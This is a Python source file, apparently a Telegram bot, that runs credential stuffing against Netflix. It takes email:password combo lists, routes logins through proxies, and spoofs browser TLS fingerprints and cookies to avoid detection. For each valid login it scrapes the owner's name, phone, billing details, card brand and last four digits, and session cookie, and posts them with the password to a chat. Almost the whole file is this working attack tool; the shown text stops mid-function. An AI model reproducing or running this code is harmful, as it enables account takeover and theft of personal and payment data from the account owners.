        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Opera 90 (Windows)",
        "impersonate": "chrome104",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 OPR/90.0.4480.84",
        "sec_ch_ua": '"Opera";v="90", "Chromium";v="104", "Not?A_Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
]


def validate_proxy(proxy_str):
    proxy_url = parse_proxy(proxy_str)
    if not proxy_url:
        return False, "Could not parse proxy string."
    try:
        session = cffi_requests.Session(impersonate="chrome133")
        session.proxies = {"http": proxy_url, "https": proxy_url}
        r = session.get("https://api.ipify.org?format=json", timeout=12)
        if r.status_code == 200:
            ip = r.json().get("ip", "unknown")
            return True, ip
        return False, f"HTTP {r.status_code} from test endpoint."
    except Exception as e:
        return False, str(e)


def pick_profile():
    return random.choice(TLS_PROFILES)


def create_session(profile):
    return cffi_requests.Session(impersonate=profile["impersonate"])


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    from urllib.parse import urlparse, quote
    if "://" in proxy_str:
        parsed = urlparse(proxy_str)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port
        user = parsed.username
        passwd = parsed.password
        if not host or not port:
            return None
        if user and passwd:
            return f"{scheme}://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        elif user:
            return f"{scheme}://{quote(user, safe='')}@{host}:{port}"
        return f"{scheme}://{host}:{port}"
    if "@" in proxy_str:
        auth_part, host_part = proxy_str.rsplit("@", 1)
        if ":" in host_part:
            host, port = host_part.rsplit(":", 1)
        else:
            return None
        if ":" in auth_part:
            user, passwd = auth_part.split(":", 1)
            return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        return f"http://{quote(auth_part, safe='')}@{host}:{port}"
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        host, port, user, passwd = parts
        return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
    elif len(parts) >= 5:
        host, port, user = parts[0], parts[1], parts[2]
        passwd = ":".join(parts[3:])
        return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
    elif len(parts) == 3:
        host, port, user = parts
        return f"http://{quote(user, safe='')}@{host}:{port}"
    return None


TIMEZONES = [
    ("Asia/Dhaka",      "+0600", "Bangladesh Standard Time"),
    ("Asia/Kolkata",    "+0530", "India Standard Time"),
    ("Europe/London",   "+0100", "British Summer Time"),
    ("America/Chicago", "-0500", "Central Daylight Time"),
    ("America/New_York","-0400", "Eastern Daylight Time"),
    ("Europe/Berlin",   "+0200", "Central European Summer Time"),
    ("Australia/Sydney","+1100", "Australian Eastern Daylight Time"),
]

COUNTRY_CODE_SMALL = {
    "AF":"af","AL":"al","DZ":"dz","AS":"as","AD":"ad","AO":"ao","AI":"ai","AQ":"aq",
    "AG":"ag","AR":"ar","AM":"am","AW":"aw","AU":"au","AT":"at","AZ":"az","BS":"bs",
    "BH":"bh","BD":"bd","BB":"bb","BY":"by","BE":"be","BZ":"bz","BJ":"bj","BM":"bm",
    "BT":"bt","BO":"bo","BA":"ba","BW":"bw","BV":"bv","BR":"br","IO":"io","BN":"bn",
    "BG":"bg","BF":"bf","BI":"bi","KH":"kh","CM":"cm","CA":"ca","CV":"cv","KY":"ky",
    "CF":"cf","TD":"td","CL":"cl","CN":"cn","CX":"cx","CC":"cc","CO":"co","KM":"km",
    "CG":"cg","CK":"ck","CR":"cr","CI":"ci","HR":"hr","CU":"cu","CY":"cy","CZ":"cz",
    "DK":"dk","DJ":"dj","DM":"dm","DO":"do","EC":"ec","EG":"eg","SV":"sv","GQ":"gq",
    "ER":"er","EE":"ee","ET":"et","FK":"fk","FO":"fo","FJ":"fj","FI":"fi","FR":"fr",
    "GF":"gf","PF":"pf","TF":"tf","GA":"ga","GM":"gm","GE":"ge","DE":"de","GH":"gh",
    "GI":"gi","GR":"gr","GL":"gl","GD":"gd","GP":"gp","GU":"gu","GT":"gt","GN":"gn",
    "GW":"gw","GY":"gy","HT":"ht","HM":"hm","HN":"hn","HK":"hk","HU":"hu","IS":"is",
    "IN":"in","ID":"id","IR":"ir","IQ":"iq","IE":"ie","IL":"il","IT":"it","JM":"jm",
    "JP":"jp","JO":"jo","KZ":"kz","KE":"ke","KI":"ki","KR":"kr","KP":"kp","KW":"kw",
    "KG":"kg","LA":"la","LV":"lv","LB":"lb","LS":"ls","LR":"lr","LY":"ly","LI":"li",
    "LT":"lt","LU":"lu","MO":"mo","MK":"mk","MG":"mg","MW":"mw","MY":"my","MV":"mv",
    "ML":"ml","MT":"mt","MH":"mh","MQ":"mq","MR":"mr","MU":"mu","YT":"yt","MX":"mx",
    "FM":"fm","MD":"md","MC":"mc","MN":"mn","ME":"me","MS":"ms","MA":"ma","MZ":"mz",
    "MM":"mm","NA":"na","NR":"nr","NP":"np","NL":"nl","AN":"an","NC":"nc","NZ":"nz",
    "NI":"ni","NE":"ne","NG":"ng","NU":"nu","NF":"nf","MP":"mp","NO":"no","OM":"om",
    "PK":"pk","PW":"pw","PS":"ps","PA":"pa","PG":"pg","PY":"py","PE":"pe","PH":"ph",
    "PN":"pn","PL":"pl","PT":"pt","PR":"pr","QA":"qa","RE":"re","RO":"ro","RU":"ru",
    "RW":"rw","SH":"sh","KN":"kn","LC":"lc","PM":"pm","VC":"vc","WS":"ws","SM":"sm",
    "ST":"st","SA":"sa","SN":"sn","RS":"rs","SC":"sc","SL":"sl","SG":"sg","SK":"sk",
    "SI":"si","SB":"sb","SO":"so","ZA":"za","GS":"gs","ES":"es","LK":"lk","SD":"sd",
    "SR":"sr","SJ":"sj","SZ":"sz","SE":"se","CH":"ch","SY":"sy","TW":"tw","TJ":"tj",
    "TZ":"tz","TH":"th","TL":"tl","TG":"tg","TK":"tk","TO":"to","TT":"tt","TN":"tn",
    "TR":"tr","TM":"tm","TC":"tc","TV":"tv","UG":"ug","UA":"ua","AE":"ae","GB":"gb",
    "US":"us","UM":"um","UY":"uy","UZ":"uz","VU":"vu","VE":"ve","VN":"vn","VG":"vg",
    "VI":"vi","WF":"wf","EH":"eh","YE":"ye","ZM":"zm","ZW":"zw",
}

COUNTRY_PHONE = {
    "AF":"93","AL":"355","DZ":"213","AS":"1684","AD":"376","AO":"244","AI":"1264",
    "AQ":"N/A","AG":"1268","AR":"54","AM":"374","AW":"297","AU":"61","AT":"43",
    "AZ":"994","BS":"1242","BH":"973","BD":"880","BB":"1246","BY":"375","BE":"32",
    "BZ":"501","BJ":"229","BM":"1441","BT":"975","BO":"591","BA":"387","BW":"267",
    "BV":"N/A","BR":"55","IO":"246","BN":"673","BG":"359","BF":"226","BI":"257",
    "KH":"855","CM":"237","CA":"1","CV":"238","KY":"1345","CF":"236","TD":"235",
    "CL":"56","CN":"86","CX":"61","CC":"61","CO":"57","KM":"269","CG":"242",
    "CK":"682","CR":"506","CI":"225","HR":"385","CU":"53","CY":"357","CZ":"420",
    "DK":"45","DJ":"253","DM":"1767","DO":"1809","EC":"593","EG":"20","SV":"503",
    "GQ":"240","ER":"291","EE":"372","ET":"251","FK":"500","FO":"298","FJ":"679",
    "FI":"358","FR":"33","GF":"594","PF":"689","TF":"N/A","GA":"241","GM":"220",
    "GE":"995","DE":"49","GH":"233","GI":"350","GR":"30","GL":"299","GD":"1473",
    "GP":"590","GU":"1671","GT":"502","GN":"224","GW":"245","GY":"592","HT":"509",
    "HM":"N/A","HN":"504","HK":"852","HU":"36","IS":"354","IN":"91","ID":"62",
    "IR":"98","IQ":"964","IE":"353","IL":"972","IT":"39","JM":"1876","JP":"81",
    "JO":"962","KZ":"7","KE":"254","KI":"686","KR":"82","KP":"850","KW":"965",
    "KG":"996","LA":"856","LV":"371","LB":"961","LS":"266","LR":"231","LY":"218",
    "LI":"423","LT":"370","LU":"352","MO":"853","MK":"389","MG":"261","MW":"265",
    "MY":"60","MV":"960","ML":"223","MT":"356","MH":"692","MQ":"596","MR":"222",
    "MU":"230","YT":"262","MX":"52","FM":"691","MD":"373","MC":"377","MN":"976",
    "ME":"382","MS":"1664","MA":"212","MZ":"258","MM":"95","NA":"264","NR":"674",
    "NP":"977","NL":"31","AN":"599","NC":"687","NZ":"64","NI":"505","NE":"227",
    "NG":"234","NU":"683","NF":"672","MP":"1670","NO":"47","OM":"968","PK":"92",
    "PW":"680","PS":"970","PA":"507","PG":"675","PY":"595","PE":"51","PH":"63",
    "PN":"N/A","PL":"48","PT":"351","PR":"1787","QA":"974","RE":"262","RO":"40",
    "RU":"7","RW":"250","SH":"290","KN":"1869","LC":"1758","PM":"508","VC":"1784",
    "WS":"685","SM":"378","ST":"239","SA":"966","SN":"221","RS":"381","SC":"248",
    "SL":"232","SG":"65","SK":"421","SI":"386","SB":"677","SO":"252","ZA":"27",
    "GS":"N/A","ES":"34","LK":"94","SD":"249","SR":"597","SJ":"47","SZ":"268",
    "SE":"46","CH":"41","SY":"963","TW":"886","TJ":"992","TZ":"255","TH":"66",
    "TL":"670","TG":"228","TK":"690","TO":"676","TT":"1868","TN":"216","TR":"90",
    "TM":"993","TC":"1649","TV":"688","UG":"256","UA":"380","AE":"971","GB":"44",
    "US":"1","UM":"N/A","UY":"598","UZ":"998","VU":"678","VE":"58","VN":"84",
    "VG":"1284","VI":"1340","WF":"681","EH":"212","YE":"967","ZM":"260","ZW":"263",
}


def generate_cookie():
    tz_entry = random.choice(TIMEZONES)
    tz_name, offset_str, display_name = tz_entry
    now = datetime.datetime.now(pytz.timezone(tz_name))
    from urllib.parse import quote
    time_part = quote(now.strftime("%H:%M:%S"))
    sign = "+" if now.utcoffset().total_seconds() >= 0 else "-"
    total_sec = int(abs(now.utcoffset().total_seconds()))
    h = total_sec // 3600
    m = (total_sec % 3600) // 60
    gmt_offset = "%s%02d%02d" % (sign, h, m)
    tz_display = display_name.replace(" ", "+")
    datestamp = "%s+%s+%s+%s+%s+GMT%%2B%s+(%s)" % (
        now.strftime("%a"), now.strftime("%b"), now.strftime("%d"),
        now.strftime("%Y"), time_part, gmt_offset, tz_display
    )
    consent_id = str(uuid.uuid4())
    return (
        "OptanonConsent=isGpcEnabled=0&datestamp=%s"
        "&version=202505.2.0&browserGpcFlag=0&isIABGlobal=false"
        "&hosts=&consentId=%s"
        "&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage"
        "&groups=C0001%%3A1%%2CC0002%%3A1%%2CC0003%%3A1%%2CC0004%%3A1"
        "&AwaitingReconsent=false"
    ) % (datestamp, consent_id)


def parse_lr(source, left, right):
    try:
        start = source.index(left) + len(left)
        end   = source.index(right, start)
        return source[start:end]
    except (ValueError, IndexError):
        return ""


def parse_regex(source, pattern, group=1):
    m = re.search(pattern, source)
    return m.group(group) if m else ""


def count_occurrences(text, word):
    return text.count(word)


def unescape_value(val):
    if not val:
        return val
    val = val.replace("\\x20", " ").replace("\\x28", "(").replace("\\x29", ")")
    val = val.replace("\\x2B", "+").replace("\\x24", "$")
    val = val.replace("\\u00A0", " ").replace("\\u200F", "").replace("\\u00A3", "£")
    try:
        val = val.encode("utf-8").decode("unicode_escape")
    except Exception:
        pass
    return val.strip()


def check_account(email, password, proxy=None):
    profile = pick_profile()
    session = create_session(profile)
    proxy_url = parse_proxy(proxy) if proxy else None
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
    req_kwargs = {"timeout": 30}
    optanon_cookie = generate_cookie()

    login_headers = {
        "Host": "www.netflix.com",
        "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"],
        "Referer": "https://www.netflix.com/",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-User": "?1",
        "Accept-Language": profile["accept_lang"],
        "Accept-Encoding": profile["accept_encoding"],
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "Cookie": optanon_cookie,
    }
    if profile.get("sec_ch_ua"):
        login_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        login_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        login_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

    try:
        r1 = session.get("https://www.netflix.com/login", headers=login_headers, **req_kwargs)
    except Exception as e:
        return {"status": "ERROR", "message": f"Login page failed: {e}"}

    if r1.status_code == 400:
        return {"status": "BAN", "message": "400 on login page"}
    if r1.status_code != 200:
        return {"status": "ERROR", "message": f"Login page status: {r1.status_code}"}

    src = r1.text
    cookies = session.cookies.get_dict()
    flwssn      = cookies.get("flwssn", "")
    nfvdid      = cookies.get("nfvdid", "")
    secure_nfid = cookies.get("SecureNetflixId", "")
    netflix_id  = cookies.get("NetflixId", "")
    gsid        = cookies.get("gsid", "")
    country         = parse_lr(src, '"country":"', '"')
    ui_version      = parse_lr(src, '"X-Netflix.uiVersion":"', '"')
    request_id      = r1.headers.get("X-Request-ID", "").replace("-", "")
    clcs_session_id = parse_lr(src, '"clcsSessionId\\":\\"', '\\"')
    referrer_rid    = parse_lr(src, '"referrerRenditionId\\":\\"', '\\"')
    uid             = str(uuid.uuid4())
    captcha_time    = random.randint(200, 950)
    country_small   = COUNTRY_CODE_SMALL.get(country, country.lower())
    country_phone   = COUNTRY_PHONE.get(country, "1")

    body = json.dumps({
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML", "imageFormat": "PNG",
            "locale": f"en-{country}",
            "serverState": json.dumps({
                "realm": "growth", "name": "PASSWORD_LOGIN",
                "clcsSessionId": clcs_session_id,
                "sessionContext": {
                    "session-breadcrumbs": {"funnel_name": "loginWeb"},
                    "login.navigationSettings": {"hideOtpToggle": True}
                }
            }),
            "serverScreenUpdate": json.dumps({
                "realm": "custom", "name": "growthLoginByPassword",
                "metadata": {"recaptchaSiteKey": "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},
                "loggingAction": "Submitted", "loggingCommand": "SubmitCommand",
                "referrerRenditionId": referrer_rid,
            }),
            "inputFields": [
                {"name": "password",              "value": {"stringValue": password}},
                {"name": "userLoginId",            "value": {"stringValue": email}},
                {"name": "countryCode",            "value": {"stringValue": country_phone}},
                {"name": "countryIsoCode",         "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime",  "value": {"intValue": captcha_time}},
                {"name": "recaptchaResponseToken", "value": {"stringValue": ""}},
            ],
        },
        "extensions": {"persistedQuery": {"id": "99afa95c-aa4e-4a8a-aecd-19ed486822af", "version": 102}}
    })

    cookie_str = (
        "netflix-mfa-nonce=Bgi_tOvcAxKVARY7wJ6HVp6Qmpy6b87rR0flzKeaPwB47PoOgAJvZCSosBbGAwB0"
        "ogxtFxjO0aIWP8CLO3Y3mtvYanTAieTfJz1junAgWKJ6XWI3Q0n9hJHkTnGaOMHgm-sZaIju7W5PXGK8t"
        f"4xjH3zFSiP8muLi-qK64naQbfqnvbFThhDBm4o-O9R5XCgT7zY7RgbgZc4DE-atLiMmGAYiDgoMf3ZET0_YJ08hgk0s; "
        f"{optanon_cookie}; flwssn={flwssn}; "
        "netflix-sans-bold-3-loaded=true; netflix-sans-normal-3-loaded=true; "
        f"gsid={gsid}; NetflixId={netflix_id}; SecureNetflixId={secure_nfid}; nfvdid={nfvdid}"
    )

    is_mobile = "iPhone" in profile["user_agent"] or "Mobile" in profile["user_agent"]
    login_api_headers = {
        "Host": "web.prod.cloud.netflix.com",
        "Cookie": cookie_str,
        "X-Netflix.context.ui-Flavor": "akira",
        "Referer": "https://www.netflix.com/",
        "User-Agent": profile["user_agent"],
        "X-Netflix.context.is-Inapp-Browser": "false",
        "X-Netflix.request.client.context": '{"appstate":"foreground"}',
        "X-Netflix.context.operation-Name": "CLCSScreenUpdate",
        "Origin": "https://www.netflix.com",
        "Sec-Fetch-Dest": "empty",
        "X-Netflix.request.id": request_id,
        "Sec-Fetch-Site": "same-site",
        "X-Netflix.context.hawkins-Version": "5.12.1",
        "X-Netflix.context.form-Factor": "phone" if is_mobile else "desktop",
        "X-Netflix.request.toplevel.uuid": uid,
        "X-Netflix.request.attempt": "1",
        "X-Netflix.request.clcs.bucket": "high",
        "Accept-Language": f"en-{country}",
        "X-Netflix.context.app-Version": ui_version,
        "Accept": profile["accept_api"],
        "Content-Type": "application/json",
        "Accept-Encoding": profile["accept_encoding"],
        "X-Netflix.context.locales": f"en-{country_small}",
        "X-Netflix.request.originating.url": (
            f"https://www.netflix.com/{country_small}/login"
            "?serverState=%7B%22realm%22%3A%22growth%22%2C%22name%22%3A%22PASSWORD_LOGIN%22%7D"
        ),
    }
    if profile.get("sec_ch_ua"):
        login_api_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        login_api_headers["Sec-Fetch-Mode"] = "cors"

    login_session = create_session(profile)
    if proxy_url:
        login_session.proxies = {"http": proxy_url, "https": proxy_url}

    r2 = None
    for attempt in range(3):
        try:
            r2 = login_session.post(
                "https://web.prod.cloud.netflix.com/graphql",
                headers=login_api_headers, data=body, **req_kwargs,
            )
        except Exception as e:
            continue
        if r2.status_code != 500:
            break
    if r2 is None:
        return {"status": "ERROR", "message": "Login request failed"}

    login_src = r2.text
    alert_msg = (
        parse_regex(login_src, r'"alert-message-body".*?"text"\s*:\s*"([^"]+)"') or
        parse_regex(login_src, r'"alertMessage".*?"text"\s*:\s*"([^"]+)"') or
        parse_regex(login_src, r'"webTextWithTags".*?"text"\s*:\s*"([^"]+)"')
    )

    if '"universal":"/browse"' in login_src:
        status = "HIT"
    elif "Incorrect password" in login_src or "incorrect password" in login_src.lower():
        return {"status": "FAIL", "message": "Incorrect password"}
    elif "too many" in login_src.lower() or "try again later" in login_src.lower():
        return {"status": "RATE_LIMITED", "message": unescape_value(alert_msg) or "Too many attempts"}
    elif "captcha" in login_src.lower() or "recaptcha" in login_src.lower():
        return {"status": "CAPTCHA", "message": unescape_value(alert_msg) or "CAPTCHA required"}
    elif 'universal":"/"},"' in login_src:
        status = "CUSTOM"
    elif "BAD_REQUEST" in login_src:
        return {"status": "BAN", "message": "BAD_REQUEST"}
    elif "CLCSScreenUpdateTransition" in login_src:
        if alert_msg:
            ac = unescape_value(alert_msg)
            if "password" in ac.lower():
                return {"status": "FAIL", "message": "Wrong password"}
            elif "locked" in ac.lower() or "suspend" in ac.lower():
                return {"status": "LOCKED", "message": ac}
            else:
                status = "CUSTOM"
        else:
            inner = parse_regex(login_src, r'"text"\s*:\s*"([^"]{5,})"')
            return {"status": "UNKNOWN", "message": unescape_value(inner) or "Transition screen"}
    else:
        return {"status": "UNKNOWN", "message": unescape_value(alert_msg) or f"HTTP {r2.status_code}"}

    for name, value in login_session.cookies.get_dict().items():
        session.cookies.set(name, value)
    updated = session.cookies.get_dict()
    netflix_id  = updated.get("NetflixId", netflix_id)
    secure_nfid = updated.get("SecureNetflixId", secure_nfid)
    nfvdid      = updated.get("nfvdid", nfvdid)

    billing_headers = {
        "Host": "www.netflix.com", "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"], "Accept-Encoding": profile["accept_encoding"],
        "Accept-Language": profile["accept_lang"], "Connection": "keep-alive",
        "Referer": "https://www.netflix.com/browse",
        "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }
    if profile.get("sec_ch_ua"):
        billing_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        billing_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        billing_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

    try:
        r3 = session.get("https://www.netflix.com/BillingActivity", headers=billing_headers, **req_kwargs)
        if r3.status_code != 200:
            r3 = session.get("https://www.netflix.com/BillingActivity", headers=billing_headers, **req_kwargs)
    except Exception as e:
        return {"status": "ERROR", "message": f"Billing page failed: {e}"}

    bill_src = r3.text
    nfid = session.cookies.get_dict().get("NetflixId", netflix_id)
    name = (
        parse_regex(bill_src, r'"userInfo"\s*:\s*\{\s*"data"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"') or
        parse_lr(bill_src, '"userInfo":{"data":{"name":"', '"')
    )
    pr = (
        parse_regex(bill_src, r'"priceFormatted"\s*:\s*"([^"]+)"') or
        parse_lr(bill_src, '{"__typename":"GrowthPrice","priceFormatted":"', '"')
    )

    account_headers = {
        "Host": "www.netflix.com", "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1", "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"], "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document", "Referer": "https://www.netflix.com/browse",
        "Accept-Language": profile["accept_lang"], "Accept-Encoding": profile["accept_encoding"],
    }
    if profile.get("sec_ch_ua"):
        account_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        account_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        account_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
        account_headers["sec-ch-ua-platform-version"] = '"15.0.0"'
        account_headers["sec-ch-ua-model"] = '""'

    try:
        r4 = session.get("https://www.netflix.com/account/", headers=account_headers, **req_kwargs)
        if r4.status_code != 200:
            r4 = session.get("https://www.netflix.com/account/", headers=account_headers, **req_kwargs)
    except Exception as e:
        return {"status": "ERROR", "message": f"Account page failed: {e}"}

    acc_src = r4.text

    def _get(src, regex, lr_l, lr_r):
        return parse_regex(src, regex) or parse_lr(src, lr_l, lr_r)

    current_country_code = _get(acc_src, r'"currentCountry"\s*:\s*"([^"]+)"', '"currentCountry":"', '"')
    member_plan = unescape_value(_get(
        acc_src,
        r'"localizedPlanName"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"',
        '"fieldGroup":"MemberPlan","fields":{"localizedPlanName":{"fieldType":"String","value":"', '"}'
    ))
    member_since = unescape_value(_get(acc_src, r'"memberSince"\s*:\s*"([^"]+)"', '"memberSince":"', '",'))
    user_on_hold = _get(acc_src, r'"isUserOnHold"\s*:\s*(true|false)', '"isUserOnHold":', ",")
    membership_status = _get(acc_src, r'"membershipStatus"\s*:\s*"([^"]+)"', '"membershipStatus":"', '",')
    max_streams = _get(acc_src, r'"maxStreams"\s*:\s*\{[^}]*"value"\s*:\s*(\d+)', '"maxStreams":{"fieldType":"Numeric","value":', "},")
    video_quality = _get(acc_src, r'"videoQuality"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', '"videoQuality":{"fieldType":"String","value":"', '"}')
    profiles_section = parse_regex(acc_src, r'"profiles"\s*:\s*(\[.*?\])', 1) or parse_lr(acc_src, '"profiles":', '}"]},')
    connected_profiles = str(count_occurrences(profiles_section, "guid"))
    extra_raw = _get(acc_src, r'"showExtraMemberSection"\s*:\s*\{[^}]*"value"\s*:\s*(true|false)', '"showExtraMemberSection":{"fieldType":"Boolean","value":', "},")
    has_extra = "Yes" if extra_raw == "true" else "No"
    slot_occupied = _get(acc_src, r'"slotState"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', 'AddOnSlot","fields":{"slotState":{"fieldType":"String","value":"', '"')
    phone_raw = _get(acc_src, r'"phoneNumberDigits"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', '"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"', '"}')
    phone_number = unescape_value(phone_raw)
    num_verified_raw = ""
    if phone_raw:
        num_verified_raw = parse_regex(acc_src, re.escape(phone_raw) + r'[^}]*"isVerified"\s*:\s*(true|false)') or parse_lr(acc_src, '","value":"' + phone_raw + '"},"isVerified":', ",")
    num_verified = "Verified" if num_verified_raw == "true" else "Not Verified"
    email_verified_raw = parse_regex(acc_src, r'"emailAddress".*?"isVerified"\s*:\s*(true|false)') or parse_lr(acc_src, '"},"isVerified":', "},")
    email_verified = "Verified" if email_verified_raw == "true" else "Not Verified"
    next_billing = unescape_value(_get(acc_src, r'"nextBillingDate"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', '"nextBillingDate":{"fieldType":"String","value":"', '"'))
    payment_method = _get(acc_src, r'"paymentMethod"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', '"paymentMethod":{"fieldType":"String","value":"', '"')
    card_brand = _get(acc_src, r'"paymentOptionLogo"\s*:\s*"([^"]+)"', '"paymentOptionLogo":"', '"')
    last_4 = _get(acc_src, r'"GrowthCardPaymentMethod"[^}]*"displayText"\s*:\s*"([^"]+)"', '"GrowthCardPaymentMethod","displayText":"', '"')

    if '"CURRENT_MEMBER":true' in acc_src:
        membership = "CURRENT MEMBER"
    elif '"FORMER_MEMBER":true' in acc_src:
        membership = "FORMER MEMBER"
    elif '"NEVER_MEMBER":true' in acc_src:
        membership = "NEVER MEMBER"
    elif '"ANONYMOUS":true' in acc_src:
        membership = "ANONYMOUS"
    else:
        membership = "UNKNOWN"

    return {
        "status": status, "email": email, "membership": membership,
        "name": name, "country": current_country_code, "plan": member_plan,
        "price": unescape_value(pr), "member_since": member_since,
        "next_billing": next_billing, "membership_status": membership_status,
        "on_hold": user_on_hold, "max_streams": max_streams,
        "video_quality": video_quality, "profiles": connected_profiles,
        "extra_member": has_extra, "slot_occupied": slot_occupied,
        "phone": phone_number, "phone_verified": num_verified,
        "email_verified": email_verified, "payment_method": payment_method,
        "card_brand": card_brand, "card_last_4": last_4, "netflix_id": nfid,
    }


def fmt_hit(r, password=""):
    return (
        f"✅ <b>HIT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email:</b> <code>{r.get('email','')}</code>\n"
        f"🔑 <b>Pass:</b> <code>{password}</code>\n"
        f"👤 <b>Name:</b> {r.get('name','')}\n"
        f"🌍 <b>Country:</b> {r.get('country','')}\n"
        f"📋 <b>Plan:</b> {r.get('plan','')}\n"
        f"💰 <b>Price:</b> {r.get('price','')}\n"
        f"📅 <b>Member Since:</b> {r.get('member_since','')}\n"
        f"🗓 <b>Next Bill:</b> {r.get('next_billing','')}\n"
        f"📊 <b>Status:</b> {r.get('membership_status','')} | {r.get('membership','')}\n"
        f"⏸ <b>On Hold:</b> {r.get('on_hold','')}\n"
        f"📺 <b>Streams:</b> {r.get('max_streams','')} | {r.get('video_quality','')}\n"
        f"👥 <b>Profiles:</b> {r.get('profiles','')}\n"
        f"➕ <b>Extra Member:</b> {r.get('extra_member','')} | {r.get('slot_occupied','')}\n"
        f"📞 <b>Phone:</b> {r.get('phone','')} ({r.get('phone_verified','')})\n"
        f"✉️ <b>Email Ver:</b> {r.get('email_verified','')}\n"
        f"💳 <b>Payment:</b> {r.get('payment_method','')} | {r.get('card_brand','')} …{r.get('card_last_4','')}\n"
        f"🆔 <b>Netflix ID:</b> <code>{r.get('netflix_id','')}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )


active_jobs = {}
active_jobs_lock = threading.Lock()


def run_bulk_check(chat_id, combos, proxy, threads):
    counters = {"hit": 0, "fail": 0, "error": 0, "rate_limited": 0,
                "captcha": 0, "ban": 0, "custom": 0, "locked": 0, "unknown": 0, "total": 0}
    c_lock = threading.Lock()
    hits_buf = []

    def do_check(email, password):
        try:
            result = check_account(email, password, proxy)
        except Exception as e:
            result = {"status": "ERROR", "message": str(e), "email": email}
        result["_password"] = password
        return result

    def update_status(msg_id, c):
        text = (
            f"⚙️ <b>Checking...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Total: {c['total']}/{len(combos)}\n"
            f"✅ Hits: {c['hit']}  ❌ Fails: {c['fail']}\n"
            f"🔄 Custom: {c['custom']}  🔒 Locked: {c['locked']}\n"
            f"⚠️ Rate: {c['rate_limited']}  🤖 Cap: {c['captcha']}\n"
            f"🚫 Ban: {c['ban']}  💥 Errors: {c['error']}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
        except Exception:
            pass

    status_msg = bot.send_message(chat_id, "⚙️ Starting checker...", parse_mode="HTML")
    msg_id = status_msg.message_id

    last_update = [0]
    update_interval = 3

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_map = {executor.submit(do_check, email, pw): (email, pw) for email, pw in combos}
        for future in as_completed(future_map):
            try:
                result = future.result()
            except Exception as e:
                result = {"status": "ERROR", "message": str(e)}
            email, pw = future_map[future]
            status = result.get("status", "UNKNOWN").upper()

            with c_lock:
                counters["total"] += 1
                counters[status.lower()] = counters.get(status.lower(), 0) + 1
                c_snap = dict(counters)

            import time
            now = time.time()
            if now - last_update[0] >= update_interval:
                last_update[0] = now
                update_status(msg_id, c_snap)

            if status == "HIT":
                hit_text = fmt_hit(result, pw)
                hits_buf.append(f"{email}:{pw}")
                try:
                    bot.send_message(chat_id, hit_text, parse_mode="HTML")
                except Exception:
                    pass
            elif status == "CUSTOM":
                try:
                    bot.send_message(chat_id, fmt_hit(result, pw).replace("✅ <b>HIT</b>", "🟡 <b>CUSTOM</b>"), parse_mode="HTML")
                except Exception:
                    pass
            elif status == "LOCKED":
                try:
                    bot.send_message(chat_id, f"🔒 <b>LOCKED</b>\n<code>{email}:{pw}</code>\n{result.get('message','')}", parse_mode="HTML")
                except Exception:
                    pass

    with c_lock:
        c_final = dict(counters)

    summary = (
